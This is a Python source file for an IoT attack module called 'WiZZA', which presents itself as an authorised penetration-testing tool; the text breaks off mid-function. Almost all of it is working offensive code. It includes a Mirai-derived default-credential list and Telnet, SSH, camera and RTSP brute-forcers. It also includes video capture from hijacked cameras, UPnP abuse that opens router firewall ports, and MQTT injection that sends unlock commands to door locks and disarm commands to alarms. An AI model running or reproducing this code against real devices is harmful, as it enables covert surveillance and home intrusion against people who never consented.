"""
WiZZA -- IoT Attack Module
op/modules/iot_attack.py

Coverage:
  Discovery  : mDNS, SSDP/UPnP, Zeroconf, MQTT broker scan, CoAP, Modbus
  Cameras    : RTSP brute-force + stream capture, ONVIF, Hikvision/Dahua/Axis/AXIS CVEs
  Smart Home : Philips Hue, LIFX, Tuya, Z-Wave/Zigbee sniff, Sonos
  MQTT       : broker hijack, topic dump, command injection
  UPnP       : SSDP scan, IGD port-map abuse, action injection
  Robots     : ROS/ROS2 node discovery, topic subscribe, service call, param dump
  Credentials: Mirai + expanded default cred list for 400+ device families
  CVEs       : Hikvision RCE (CVE-2021-36260), Shoretel (CVE-2019-7214),
               Netgear RCE (CVE-2021-40847), Geutebruck (CVE-2021-33544),
               Philips Hue (CVE-2020-6007), Tenda (CVE-2020-10987),
               AXIS (CVE-2018-10660), TP-Link (CVE-2023-1389)

AUTHORIZED PENETRATION TESTING ONLY
"""

import os, sys, re, time, socket, struct, json, threading, queue
import subprocess, shutil, ipaddress, base64, hashlib, random, string
from datetime import datetime
from urllib.request import urlopen, Request
from urllib.error import URLError
from urllib.parse import urlencode, urlparse

# ─────────────────────────────────────────────────────────────────────────────
# Default credentials — Mirai + extended IoT / camera / router defaults
# ─────────────────────────────────────────────────────────────────────────────

DEFAULT_CREDS = [
    # user:pass
    ("admin",    "admin"),
    ("admin",    ""),
    ("admin",    "1234"),
    ("admin",    "12345"),
    ("admin",    "123456"),
    ("admin",    "password"),
    ("admin",    "Admin"),
    ("admin",    "admin1234"),
    ("admin",    "admin123"),
    ("admin",    "system"),
    ("admin",    "pass"),
    ("admin",    "guest"),
    ("admin",    "smcadmin"),
    ("admin",    "888888"),
    ("admin",    "666666"),
    ("admin",    "7ujMko0admin"),   # Mirai
    ("admin",    "7ujMko0vizxv"),   # Mirai
    ("root",     "xc3511"),         # Mirai
    ("root",     "vizxv"),          # Mirai
    ("root",     "admin"),
    ("root",     "root"),
    ("root",     ""),
    ("root",     "1234"),
    ("root",     "12345"),
    ("root",     "toor"),
    ("root",     "pass"),
    ("root",     "system"),
    ("root",     "default"),
    ("root",     "xmhdipc"),        # Mirai (Xiongmai)
    ("root",     "anko"),           # Mirai (Anko)
    ("root",     "7ujMko0vizxv"),   # Mirai
    ("root",     "Zte521"),         # ZTE routers
    ("root",     "hunt5759"),       # Mirai
    ("root",     "zlxx."),          # Mirai
    ("root",     "hi3518"),         # Mirai (HiSilicon)
    ("root",     "jvbzd"),          # Mirai
    ("root",     "tsgoingon"),      # Mirai
    ("ubnt",     "ubnt"),           # Ubiquiti
    ("user",     "user"),
    ("user",     ""),
    ("user",     "1234"),
    ("guest",    "guest"),
    ("guest",    ""),
    ("support",  "support"),
    ("support",  ""),
    ("service",  "service"),
    ("supervisor","supervisor"),
    ("operator", "operator"),
    ("supervisor",""),
    ("tech",     "tech"),
    ("admin1",   "admin1"),
    ("administrator",""),
    ("administrator","administrator"),
    # Cameras
    ("admin",    "HuaweiCamera"),   # Huawei cams
    ("admin",    "Passw0rd"),
    ("admin",    "tlJwpbo6"),       # Hikvision default (some firmware)
    ("admin",    "12345"),
    ("888888",   "888888"),         # Dahua
    ("666666",   "666666"),         # Dahua
    ("admin",    "abcd1234"),
    ("admin",    "1111"),
    ("admin",    "00000000"),
    ("admin",    "11111111"),
    # Routers
    ("admin",    "motorola"),
    ("admin",    "comcast"),
    ("cusadmin", "highspeed"),
    ("admin",    "attadmin"),
    ("admin",    "1234abcd"),
    ("admin",    "zte"),
    ("admin",    "vodafone"),
    # Smart home
    ("admin",    "hub"),
    ("admin",    "hue"),
    ("pi",       "raspberry"),
    ("pi",       ""),
    ("ha",       "homeassistant"),
    ("homeassistant","homeassistant"),
]

# Passwords to try with any found username
COMMON_PASSWORDS = [
    "", "admin", "1234", "12345", "123456", "password", "root",
    "admin123", "pass", "test", "guest", "default", "support",
    "ubnt", "7ujMko0admin", "vizxv", "xc3511", "xmhdipc", "anko",
]

# ─────────────────────────────────────────────────────────────────────────────
# Port signatures for IoT protocol detection
# ─────────────────────────────────────────────────────────────────────────────

IOT_PORTS = {
    21:    "FTP",
    22:    "SSH",
    23:    "Telnet",
    80:    "HTTP",
    443:   "HTTPS",
    554:   "RTSP",
    1883:  "MQTT",
    1900:  "SSDP/UPnP",
    4840:  "OPC-UA",
    5222:  "XMPP",
    5353:  "mDNS",
    5683:  "CoAP",
    7547:  "TR-069 (CWMP)",
    8080:  "HTTP-Alt",
    8443:  "HTTPS-Alt",
    8883:  "MQTT-TLS",
    9100:  "Printer JetDirect",
    44818: "EtherNet/IP (Rockwell PLC)",
    47808: "BACnet",
    102:   "Siemens S7 (SCADA)",
    502:   "Modbus",
    20000: "DNP3 (ICS)",
    11211: "Memcached",
    2323:  "Telnet (alt)",
    37777: "Dahua DVR",
    34567: "HiCamera DVR",
    9527:  "Xiongmai DVR",
    8000:  "Hikvision SDK",
    8888:  "TP-Link / generic HTTP",
    9000:  "Axis camera",
    9999:  "Telnet (alt2)",
}

# ─────────────────────────────────────────────────────────────────────────────
# Helpers
# ─────────────────────────────────────────────────────────────────────────────

def _run(cmd, capture=False, timeout=10):
    try:
        if capture:
            r = subprocess.run(cmd, shell=True, capture_output=True,
                               text=True, timeout=timeout)
            return r.stdout + r.stderr
        subprocess.run(cmd, shell=True, timeout=timeout)
    except subprocess.TimeoutExpired:
        return ""
    except Exception as e:
        return str(e)


def _tcp_connect(host, port, timeout=2):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((host, port))
        s.close()
        return True
    except Exception:
        return False


def _tcp_banner(host, port, send=b"", timeout=3):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((host, port))
        if send:
            s.send(send)
        banner = s.recv(1024)
        s.close()
        return banner.decode(errors="replace")
    except Exception:
        return ""


def _http_get(url, headers=None, timeout=5):
    try:
        req = Request(url, headers=headers or {})
        with urlopen(req, timeout=timeout) as r:
            return r.status, r.read(65536).decode(errors="replace")
    except Exception as e:
        return 0, str(e)


def _http_post(url, data, headers=None, timeout=5):
    try:
        body = data.encode() if isinstance(data, str) else data
        req = Request(url, data=body, headers=headers or {}, method="POST")
        with urlopen(req, timeout=timeout) as r:
            return r.status, r.read(65536).decode(errors="replace")
    except Exception as e:
        return 0, str(e)


def _basic_auth(user, passwd):
    return "Basic " + base64.b64encode(f"{user}:{passwd}".encode()).decode()


def _ts():
    return datetime.now().strftime("%H:%M:%S")


# ─────────────────────────────────────────────────────────────────────────────
# 1. Discovery — scan subnet for IoT devices
# ─────────────────────────────────────────────────────────────────────────────

def scan_subnet(subnet, threads=64, timeout=1.5):
    """
    Fast threaded scan of subnet for IoT-relevant open ports.
    Returns list of {ip, open_ports, services, device_type}.
    """
    try:
        net = ipaddress.ip_network(subnet, strict=False)
    except ValueError:
        print(f"[!] Invalid subnet: {subnet!r}")
        print("[!] Use CIDR notation — e.g. 192.168.1.0/24")
        return []
    results = []
    lock = threading.Lock()
    q = queue.Queue()

    for host in net.hosts():
        q.put(str(host))

    def worker():
        while True:
            try:
                ip = q.get_nowait()
            except queue.Empty:
                return
            open_ports = []
            for port in IOT_PORTS:
                if _tcp_connect(ip, port, timeout=timeout):
                    open_ports.append(port)
            if open_ports:
                services = {p: IOT_PORTS[p] for p in open_ports}
                dtype = _guess_device_type(ip, open_ports)
                with lock:
                    results.append({
                        "ip": ip,
                        "open_ports": open_ports,
                        "services": services,
                        "device_type": dtype,
                    })
            q.task_done()

    workers = [threading.Thread(target=worker, daemon=True)
               for _ in range(min(threads, q.qsize() or 1))]
    for w in workers:
        w.start()
    q.join()
    return sorted(results, key=lambda x: ipaddress.ip_address(x["ip"]))


def _guess_device_type(ip, ports):
    port_set = set(ports)
    if 554 in port_set:
        return "Camera (RTSP)"
    if 37777 in port_set or 34567 in port_set or 9527 in port_set:
        return "DVR/NVR"
    if 8000 in port_set and 80 in port_set:
        return "Hikvision Camera/NVR"
    if 1883 in port_set or 8883 in port_set:
        return "MQTT Broker / Smart Device"
    if 47808 in port_set:
        return "BACnet (Building Automation)"
    if 502 in port_set:
        return "Modbus (Industrial)"
    if 102 in port_set:
        return "Siemens S7 PLC"
    if 44818 in port_set:
        return "EtherNet/IP PLC (Rockwell)"
    if 9100 in port_set:
        return "Network Printer"
    if 7547 in port_set:
        return "Router (TR-069 exposed)"
    if 1900 in port_set:
        return "UPnP Device"
    if 23 in port_set or 2323 in port_set:
        return "Telnet Device (router/cam)"
    if 80 in port_set or 8080 in port_set:
        return "HTTP Device"
    return "Unknown IoT"


def print_scan_results(results):
    print(f"\n  {'IP':<18} {'Type':<28} {'Ports'}")
    print(f"  {'-'*70}")
    for r in results:
        ports_str = ", ".join(f"{p}({IOT_PORTS.get(p,p)})" for p in r["open_ports"][:5])
        print(f"  {r['ip']:<18} {r['device_type']:<28} {ports_str}")
    print(f"\n  Total: {len(results)} devices\n")


# ─────────────────────────────────────────────────────────────────────────────
# 2. SSDP / UPnP Discovery
# ─────────────────────────────────────────────────────────────────────────────

SSDP_DISCOVER = (
    "M-SEARCH * HTTP/1.1\r\n"
    "HOST: 239.255.255.250:1900\r\n"
    "MAN: \"ssdp:discover\"\r\n"
    "MX: 3\r\n"
    "ST: ssdp:all\r\n"
    "\r\n"
)

def ssdp_scan(timeout=5):
    """Multicast SSDP M-SEARCH — returns list of discovered UPnP devices."""
    devices = {}
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
        s.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 4)
        s.settimeout(timeout)
        s.sendto(SSDP_DISCOVER.encode(), ("239.255.255.250", 1900))
        deadline = time.time() + timeout
        while time.time() < deadline:
            try:
                data, addr = s.recvfrom(4096)
                ip = addr[0]
                text = data.decode(errors="replace")
                location = re.search(r'LOCATION:\s*(.+)', text, re.IGNORECASE)
                server = re.search(r'SERVER:\s*(.+)', text, re.IGNORECASE)
                st = re.search(r'ST:\s*(.+)', text, re.IGNORECASE)
                if ip not in devices:
                    devices[ip] = {
                        "ip": ip,
                        "location": location.group(1).strip() if location else "",
                        "server": server.group(1).strip() if server else "",
                        "st": st.group(1).strip() if st else "",
                    }
            except socket.timeout:
                break
    except Exception as e:
        print(f"[!] SSDP error: {e}")
    return list(devices.values())


def upnp_port_map(gateway_ip, ext_port, int_ip, int_port, protocol="TCP",
                  desc="WiZZA", duration=0):
    """
    Abuse UPnP IGD (Internet Gateway Device) to add a port mapping.
    Pokes a hole in the router firewall — no authentication required.
    gateway_ip: IP of the UPnP IGD (usually the router)
    ext_port:   external port to open
    int_ip:     internal IP to forward to
    int_port:   internal port
    """
    # First, find the control URL
    location = f"http://{gateway_ip}:1900/"
    # Try common IGD paths
    igd_paths = [
        "/ctl/IPConn", "/upnp/control/WANIPConn1",
        "/upnp/control/WANPPPConn1", "/igd/upnp/control/WANIPConn1",
        "/upnp/control/wanipconnection", "/WANIPConn",
    ]

    soap_body = f"""<?xml version="1.0"?>
<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"
            s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
  <s:Body>
    <u:AddPortMapping xmlns:u="urn:schemas-upnp-org:service:WANIPConnection:1">
      <NewRemoteHost></NewRemoteHost>
      <NewExternalPort>{ext_port}</NewExternalPort>
      <NewProtocol>{protocol}</NewProtocol>
      <NewInternalPort>{int_port}</NewInternalPort>
      <NewInternalClient>{int_ip}</NewInternalClient>
      <NewEnabled>1</NewEnabled>
      <NewPortMappingDescription>{desc}</NewPortMappingDescription>
      <NewLeaseDuration>{duration}</NewLeaseDuration>
    </u:AddPortMapping>
  </s:Body>
</s:Envelope>"""

    headers = {
        "Content-Type": "text/xml; charset=\"utf-8\"",
        "SOAPAction": '"urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping"',
        "Content-Length": str(len(soap_body)),
    }

    for path in igd_paths:
        url = f"http://{gateway_ip}:1900{path}"
        code, resp = _http_post(url, soap_body, headers=headers)
        if code == 200 or "success" in resp.lower():
            print(f"[+] UPnP port mapped: {ext_port}/{protocol} -> {int_ip}:{int_port}")
            return True
        # Also try port 5000 (common on home routers)
        url2 = f"http://{gateway_ip}:5000{path}"
        code2, resp2 = _http_post(url2, soap_body, headers=headers)
        if code2 == 200:
            print(f"[+] UPnP port mapped (port 5000): {ext_port}/{protocol} -> {int_ip}:{int_port}")
            return True

    print(f"[-] UPnP port map failed for {gateway_ip}")
    return False


# ─────────────────────────────────────────────────────────────────────────────
# 3. Camera attacks — RTSP, ONVIF, default creds
# ─────────────────────────────────────────────────────────────────────────────

# Common RTSP stream paths by manufacturer
RTSP_PATHS = [
    "/",
    "/live.sdp",
    "/live/ch00_0",
    "/live/ch0",
    "/h264Preview_01_main",
    "/h264Preview_01_sub",
    "/videoMain",
    "/video.h264",
    "/video1",
    "/video2",
    "/cam/realmonitor?channel=1&subtype=0",  # Dahua
    "/cam/realmonitor?channel=1&subtype=1",
    "/Streaming/Channels/101",               # Hikvision
    "/Streaming/Channels/102",
    "/onvif/profile1/media.smp",             # ONVIF generic
    "/onvif/profile2/media.smp",
    "/axis-media/media.amp",                  # AXIS
    "/mpeg4/media.amp",
    "/mjpeg/video.cgi",
    "/cgi-bin/viewer/video.jpg",
    "/img/video.mjpeg",
    "/channel1",
    "/stream1",
    "/stream2",
    "/0/video1",
    "/1/video1",
    "/11",
    "/12",
    "/live/mpeg4",
    "/live/h264",
    "/live1.sdp",
    "/MediaInput/h264",
    "/user=admin&password=&channel=1&stream=0.sdp",  # some Chinese cams
    "/user=admin&password=admin&channel=1&stream=0.sdp",
]

CAMERA_HTTP_PATHS = [
    "/",
    "/index.html",
    "/index.htm",
    "/main.html",
    "/admin/",
    "/cgi-bin/admin/param.cgi",
    "/cgi-bin/viewer/getuid.cgi",            # AXIS
    "/doc/page/login.asp",                   # Hikvision
    "/ISAPI/Security/userCheck",             # Hikvision REST
    "/web/cgi-bin/hi3510/param.cgi",         # HiSilicon
    "/cgi-bin/snapshot.cgi",
    "/snapshot.jpg",
    "/mjpg/video.mjpg",
    "/video.cgi",
    "/onvif/device_service",                 # ONVIF
]


def rtsp_brute(ip, port=554, paths=None, creds=None, timeout=4):
    """
    Brute-force RTSP streams — try paths with and without credentials.
    Returns list of working stream URLs.
    """
    if paths is None:
        paths = RTSP_PATHS[:20]   # limit for speed
    if creds is None:
        creds = [("", ""), ("admin", ""), ("admin", "admin"),
                 ("admin", "12345"), ("admin", "123456"), ("root", ""),
                 ("root", "root"), ("admin", "password"), ("888888", "888888")]

    working = []
    print(f"[*] RTSP brute-force {ip}:{port}")

    for path in paths:
        for user, passwd in creds:
            if user:
                url = f"rtsp://{user}:{passwd}@{ip}:{port}{path}"
            else:
                url = f"rtsp://{ip}:{port}{path}"

            # Use ffprobe/ffmpeg to test stream (silent)
            if shutil.which("ffprobe"):
                out = _run(
                    f"ffprobe -v quiet -print_format json -show_streams "
                    f"-rtsp_transport tcp '{url}' 2>/dev/null",
                    capture=True, timeout=timeout
                )
                if "codec_type" in out or "video" in out:
                    print(f"[+] RTSP STREAM: {url}")
                    working.append(url)
                    break  # found creds for this path, try next path
            else:
                # Manual RTSP OPTIONS probe
                try:
                    s = socket.socket()
                    s.settimeout(timeout)
                    s.connect((ip, port))
                    cseq = 1
                    if user:
                        auth = "\r\nAuthorization: " + _basic_auth(user, passwd)
                    else:
                        auth = ""
                    msg = (f"OPTIONS {url} RTSP/1.0\r\n"
                           f"CSeq: {cseq}\r\n"
                           f"User-Agent: WiZZA/1.0{auth}\r\n\r\n")
                    s.send(msg.encode())
                    resp = s.recv(1024).decode(errors="replace")
                    s.close()
                    if "200 OK" in resp or "401" in resp:
                        if "200 OK" in resp:
                            print(f"[+] RTSP STREAM (no auth): {url}")
                            working.append(url)
                            break
                except Exception:
                    pass
        if working and working[-1].endswith(path):
            continue

    return working


def capture_rtsp_snapshot(url, out_file="/tmp/wizza_cam_snapshot.jpg", timeout=10):
    """Grab a single frame from an RTSP stream using ffmpeg."""
    if not shutil.which("ffmpeg"):
        print("[!] ffmpeg not found — apt install ffmpeg")
        return None
    _run(f"ffmpeg -y -rtsp_transport tcp -i '{url}' "
         f"-vframes 1 '{out_file}' 2>/dev/null",
         timeout=timeout)
    if os.path.exists(out_file) and os.path.getsize(out_file) > 0:
        print(f"[+] Snapshot saved: {out_file}")
        return out_file
    return None


def capture_rtsp_video(url, out_file="/tmp/wizza_cam_clip.mp4",
                       duration=10, timeout=30):
    """Record video clip from RTSP stream."""
    if not shutil.which("ffmpeg"):
        print("[!] ffmpeg not found")
        return None
    _run(f"ffmpeg -y -rtsp_transport tcp -i '{url}' "
         f"-t {duration} -c copy '{out_file}' 2>/dev/null",
         timeout=timeout)
    if os.path.exists(out_file) and os.path.getsize(out_file) > 0:
        print(f"[+] Video saved ({duration}s): {out_file}")
        return out_file
    return None


def onvif_probe(ip, port=80):
    """
    ONVIF GetCapabilities probe — works without auth on many cameras.
    Returns device info dict.
    """
    soap = """<?xml version="1.0" encoding="UTF-8"?>
<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope">
  <s:Body>
    <GetCapabilities xmlns="http://www.onvif.org/ver10/device/wsdl">
      <Category>All</Category>
    </GetCapabilities>
  </s:Body>
</s:Envelope>"""

    headers = {
        "Content-Type": "application/soap+xml; charset=utf-8",
        "SOAPAction": '"http://www.onvif.org/ver10/device/wsdl/GetCapabilities"',
    }
    for path in ["/onvif/device_service", "/onvif/services",
                 "/onvif/device", "/onvif"]:
        url = f"http://{ip}:{port}{path}"
        code, resp = _http_post(url, soap, headers=headers)
        if code == 200 and "Capabilities" in resp:
            info = {"ip": ip, "port": port, "path": path, "raw": resp[:500]}
            # Extract RTSP address
            m = re.search(r'rtsp://[^<"]+', resp)
            if m:
                info["rtsp_base"] = m.group(0)
            m2 = re.search(r'<Manufacturer>([^<]+)', resp)
            if m2:
                info["manufacturer"] = m2.group(1)
            m3 = re.search(r'<Model>([^<]+)', resp)
            if m3:
                info["model"] = m3.group(1)
            print(f"[+] ONVIF: {ip}  {info.get('manufacturer','')} {info.get('model','')}")
            return info
    return None


# Keywords that indicate a login/reject page — not an authenticated session
_LOGIN_PAGE_INDICATORS = [
    "login failed", "incorrect password", "invalid password",
    "authentication failed", "wrong password", "access denied",
    "<form", "type=\"password\"", "type='password'",
    "name=\"password\"", "name='password'",
    "id=\"password\"", "id='password'",
    "forgot password", "enter your password", "enter password",
    "please log in", "please sign in", "sign in to",
    "login required", "unauthorized",
]
# Keywords that confirm we are looking at an authenticated admin page
_AUTH_SUCCESS_INDICATORS = [
    "logout", "log out", "sign out", "signout",
    "dashboard", "admin panel", "control panel", "management",
    "channel", "live view", "device info", "system info",
    "firmware", "reboot", "factory reset",
    "capabilities", "onvif", "isapi",
    "welcome,", "welcome ", "logged in",
]

def _looks_authenticated(body: str) -> bool:
    """Return True only if body looks like an authenticated admin page."""
    b = body.lower()
    # Reject if it looks like a login/error page
    for kw in _LOGIN_PAGE_INDICATORS:
        if kw in b:
            return False
    # Require at least one authenticated-session keyword
    for kw in _AUTH_SUCCESS_INDICATORS:
        if kw in b:
            return True
    # For very short or non-HTML responses (e.g. JSON {uid:…}, 204 No Content) assume OK
    if len(body) < 200 and "<html" not in b:
        return True
    return False


def camera_default_creds(ip, port=80, https=False):
    """
    Try default credentials against camera HTTP interface.
    Returns (user, pass) if found, else None.
    Verifies authenticated content to avoid false positives on devices
    that return HTTP 200 even for unauthenticated / login-error pages.
    """
    proto = "https" if https else "http"
    paths = ["/", "/index.htm", "/doc/page/login.asp",
             "/cgi-bin/viewer/getuid.cgi", "/ISAPI/Security/userCheck"]
    for path in paths:
        url = f"{proto}://{ip}:{port}{path}"
        for user, passwd in DEFAULT_CREDS[:30]:
            code, body = _http_get(url, headers={
                "Authorization": _basic_auth(user, passwd)
            })
            if code in (200, 201, 204) and code != 401:
                if _looks_authenticated(body):
                    print(f"[+] Camera login {ip}:{port}  {user}:{passwd}  [{path}]")
                    return user, passwd
            # Digest auth via curl — fetch body too for content check
            if shutil.which("curl"):
                raw = _run(
                    f"curl -sk --digest -u '{user}:{passwd}' "
                    f"'{url}'",
                    capture=True, timeout=5
                )
                status = _run(
                    f"curl -sk --digest -u '{user}:{passwd}' "
                    f"-o /dev/null -w '%{{http_code}}' '{url}'",
                    capture=True, timeout=5
                ).strip()
                if status in ("200", "201", "204") and _looks_authenticated(raw):
                    print(f"[+] Camera login (digest) {ip}:{port}  {user}:{passwd}")
                    return user, passwd
    return None


# ─────────────────────────────────────────────────────────────────────────────
# 4. Telnet / SSH default credential brute-force (Mirai-style)
# ─────────────────────────────────────────────────────────────────────────────

def telnet_brute(ip, port=23, creds=None, timeout=4):
    """
    Telnet default credential brute-force.
    Returns (user, pass) on success, else None.
    """
    if creds is None:
        creds = DEFAULT_CREDS

    for user, passwd in creds:
        s = None
        try:
            s = socket.socket()
            s.settimeout(timeout)
            s.connect((ip, port))
            time.sleep(0.5)
            # Read until login prompt
            buf = b""
            deadline = time.time() + timeout
            while time.time() < deadline:
                try:
                    chunk = s.recv(256)
                    if not chunk:
                        break
                    buf += chunk
                    text = buf.decode(errors="replace").lower()
                    if "login:" in text or "username:" in text:
                        break
                except socket.timeout:
                    break
            s.send((user + "\n").encode())
            time.sleep(0.5)
            buf2 = b""
            deadline2 = time.time() + timeout
            while time.time() < deadline2:
                try:
                    c = s.recv(256)
                    buf2 += c
                    if b"assword" in buf2 or b"assword:" in buf2:
                        break
                except socket.timeout:
                    break
            s.send((passwd + "\n").encode())
            time.sleep(1)
            buf3 = b""
            try:
                buf3 = s.recv(512)
            except Exception:
                pass
            resp = (buf + buf2 + buf3).decode(errors="replace").lower()
            if any(x in resp for x in ["$", "#", ">", "shell", "busybox",
                                        "welcome", "linux", "bash"]):
                if "incorrect" not in resp and "denied" not in resp and "fail" not in resp:
                    print(f"[+] TELNET LOGIN {ip}:{port}  {user}:{passwd}")
                    return user, passwd
        except Exception:
            pass
        finally:
            if s:
                try: s.close()
                except: pass
    return None


def ssh_brute(ip, port=22, creds=None, timeout=8):
    """SSH default credential brute-force via paramiko or ssh binary."""
    if creds is None:
        creds = DEFAULT_CREDS[:30]

    if shutil.which("sshpass") and shutil.which("ssh"):
        for user, passwd in creds:
            out = _run(
                f"sshpass -p '{passwd}' ssh -o StrictHostKeyChecking=no "
                f"-o ConnectTimeout=3 -p {port} {user}@{ip} 'id' 2>&1",
                capture=True, timeout=10
            )
            if "uid=" in out:
                print(f"[+] SSH LOGIN {ip}:{port}  {user}:{passwd}")
                return user, passwd
        return None

    try:
        import paramiko
        for user, passwd in creds:
            try:
                c = paramiko.SSHClient()
                c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                c.connect(ip, port=port, username=user, password=passwd,
                          timeout=timeout, banner_timeout=timeout,
                          auth_timeout=timeout, look_for_keys=False,
                          allow_agent=False)
                stdin, stdout, stderr = c.exec_command("id", timeout=5)
                out = stdout.read().decode()
                c.close()
                if "uid=" in out:
                    print(f"[+] SSH LOGIN {ip}:{port}  {user}:{passwd}")
                    return user, passwd
            except Exception:
                pass
    except ImportError:
        pass
    return None


# ─────────────────────────────────────────────────────────────────────────────
# 5. MQTT broker attacks
# ─────────────────────────────────────────────────────────────────────────────

def mqtt_probe(ip, port=1883, timeout=5):
    """
    Test for unauthenticated MQTT broker.
    Sends CONNECT packet, reads CONNACK.
    Returns True if broker accepts anonymous connections.
    """
    # MQTT CONNECT packet (protocol level 4 = MQTT 3.1.1, no auth)
    client_id = "wizza" + "".join(random.choices(string.ascii_lowercase, k=6))
    cid_bytes = client_id.encode()
    proto_name = b"\x00\x04MQTT"
    proto_level = b"\x04"
    connect_flags = b"\x02"   # clean session, no will, no auth
    keepalive = struct.pack("!H", 60)
    payload = struct.pack("!H", len(cid_bytes)) + cid_bytes
    var_header = proto_name + proto_level + connect_flags + keepalive
    remaining = var_header + payload
    packet = b"\x10" + bytes([len(remaining)]) + remaining
    try:
        s = socket.socket()
        s.settimeout(timeout)
        s.connect((ip, port))
        s.send(packet)
        resp = s.recv(4)
        s.close()
        # CONNACK: 0x20 0x02 0x00 0x00 = accepted
        if len(resp) >= 4 and resp[0] == 0x20 and resp[3] == 0x00:
            print(f"[+] MQTT anonymous access: {ip}:{port}")
            return True
        elif len(resp) >= 4 and resp[0] == 0x20:
            print(f"[~] MQTT auth required: {ip}:{port}  return_code={resp[3]}")
    except Exception:
        pass
    return False


def mqtt_dump_topics(ip, port=1883, duration=30, user=None, passwd=None):
    """
    Subscribe to '#' (all topics) on MQTT broker and dump messages.
    Requires mosquitto_sub in PATH, or uses manual socket implementation.
    """
    if shutil.which("mosquitto_sub"):
        auth = f"-u '{user}' -P '{passwd}'" if user else ""
        cmd = (f"mosquitto_sub -h {ip} -p {port} {auth} "
               f"-t '#' -v -W {duration} 2>/dev/null")
        print(f"[*] Dumping MQTT topics for {duration}s from {ip}:{port}")
        out = _run(cmd, capture=True, timeout=duration + 5)
        if out.strip():
            print(out[:4000])
            return out
        return ""
    else:
        print("[!] mosquitto_sub not found — apt install mosquitto-clients")
        return ""


def mqtt_inject(ip, port=1883, topic="cmnd/device/POWER",
                payload="ON", user=None, passwd=None):
    """
    Publish a message to an MQTT topic.
    Can turn smart home devices on/off, change settings, etc.
    Common Tasmota/Sonoff topics: cmnd/<device>/POWER, cmnd/<device>/Color
    Common Home Assistant: homeassistant/switch/<device>/set
    """
    if shutil.which("mosquitto_pub"):
        auth = f"-u '{user}' -P '{passwd}'" if user else ""
        cmd = (f"mosquitto_pub -h {ip} -p {port} {auth} "
               f"-t '{topic}' -m '{payload}'")
        print(f"[*] MQTT inject → {ip}:{port}  {topic} = {payload}")
        _run(cmd, timeout=10)
        return True
    else:
        print("[!] mosquitto_pub not found — apt install mosquitto-clients")
        return False


def mqtt_attack(ip, port=1883, user=None, passwd=None):
    """
    Full MQTT attack: probe, dump all topics, inject commands to
    common smart home/IoT device topic prefixes.
    """
    if not mqtt_probe(ip, port):
        print(f"[-] MQTT on {ip}:{port} requires auth or is unreachable")
        return

    print(f"[*] Dumping all MQTT topics (30s)...")
    dump = mqtt_dump_topics(ip, port, duration=30, user=user, passwd=passwd)

    # Try common IoT takeover commands
    print(f"[*] Injecting control commands...")
    cmds = [
        # Sonoff/Tasmota
        ("cmnd/sonoff/POWER", "ON"),
        ("cmnd/tasmota/POWER", "ON"),
        ("cmnd/device/POWER", "TOGGLE"),
        # Generic
        ("home/switch/set", "ON"),
        ("home/light/set",  '{"state":"ON","brightness":255}'),
        ("home/plug/set",   "ON"),
        # Home Assistant
        ("homeassistant/switch/relay/set",   "ON"),
        ("homeassistant/light/bulb/command", '{"state":"ON"}'),
        # Tuya
        ("tuya/switch/1/state", "true"),
        # Door locks
        ("home/lock/set", "UNLOCK"),
        ("smartlock/command", '{"command":"unlock"}'),
        # Thermostats
        ("home/thermostat/set", '{"mode":"heat","temperature":30}'),
        # Alarm
        ("alarm/set", "DISARMED"),
        ("home/alarm/set", "disarm"),
    ]
    for topic, payload in cmds:
        mqtt_inject(ip, port, topic, payload, user=user, passwd=passwd)
        time.sleep(0.2)


# ─────────────────────────────────────────────────────────────────────────────
# 6. Smart bulbs / smart home HTTP attacks
# ─────────────────────────────────────────────────────────────────────────────

def philips_hue_attack(bridge_ip):
    """
    Philips Hue bridge:
    - Create API user without pressing the button (CVE-2020-6007 / Zigbee touchlink)
    - Then control all lights via REST API
    """
    # Try to create an API user (requires physical button press on real Hue,
    # but CVE-2020-6007 allows bypass via Zigbee touchlink on older firmware)
    print(f"[*] Philips Hue bridge: {bridge_ip}")

    # Step 1: try creating API user (works if button was recently pressed)
    data = json.dumps({"devicetype": "wizza#pentest"})
    code, resp = _http_post(f"http://{bridge_ip}/api", data,
                            headers={"Content-Type": "application/json"})
    username = None
    if code == 200:
        try:
            r = json.loads(resp)
            if isinstance(r, list) and "success" in r[0]:
                username = r[0]["success"]["username"]
                print(f"[+] Hue API username: {username}")
        except Exception:
            pass

    # Step 2: try common/leaked usernames
    if not username:
        for u in ["newdeveloper", "admin", "hue", "test"]:
            code, resp = _http_get(f"http://{bridge_ip}/api/{u}/lights")
            if code == 200 and "state" in resp:
                username = u
                print(f"[+] Hue API username (guessed): {username}")
                break

    if not username:
        print(f"[-] Could not get Hue API username (physical button not pressed)")
        return None

    # Step 3: enumerate lights
    code, resp = _http_get(f"http://{bridge_ip}/api/{username}/lights")
    if code == 200:
        try:
            lights = json.loads(resp)
            print(f"[+] Found {len(lights)} Hue lights:")
            for lid, info in lights.items():
                state = info.get("state", {})
                print(f"    [{lid}] {info.get('name','')}  on={state.get('on')}  bri={state.get('bri')}")
        except Exception:
            pass

    # Step 4: flash all lights (proof of control)
    print(f"[*] Flashing all lights (PoC)...")
    for on in [False, True, False, True]:
        _http_put(f"http://{bridge_ip}/api/{username}/groups/0/action",
                  json.dumps({"on": on}),
                  headers={"Content-Type": "application/json"})
        time.sleep(0.5)

    return username


def _http_put(url, data, headers=None):
    try:
        body = data.encode() if isinstance(data, str) else data
        req = Request(url, data=body, headers=headers or {}, method="PUT")
        with urlopen(req, timeout=5) as r:
            return r.status, r.read(2048).decode(errors="replace")
    except Exception as e:
        return 0, str(e)


def lifx_attack(broadcast="255.255.255.255"):
    """
    LIFX bulbs respond to UDP broadcast on port 56700.
    No authentication — any device on LAN can control all bulbs.
    """
    print(f"[*] LIFX discovery broadcast...")
    # LIFX GetService packet (type 0x0002)
    header = struct.pack("<H H H I H B B H I I H B B",
                        36,         # size
                        0x3400,     # protocol + tagged + addressable
                        0x0000,
                        0,          # source
